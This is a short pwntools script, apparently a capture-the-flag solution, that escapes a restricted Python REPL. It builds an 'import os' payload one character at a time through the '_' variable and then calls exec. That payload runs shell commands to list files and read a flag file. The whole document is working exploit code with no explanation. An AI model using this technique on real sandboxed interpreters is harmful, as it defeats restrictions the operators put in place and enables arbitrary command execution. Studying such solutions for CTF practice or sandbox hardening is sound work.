from pwn import *

r = remote('localhost', 9000)

payload = "mport os; o=os.system; o('ls'); o('cat *flag.txt')"

r.recvuntil(">>> ")
r.sendline("'i'")

for i in payload:
	r.sendline("_+'{}'".format(i))

r.sendline("a=_")
r.sendline("exec")
r.sendline("_(a)")
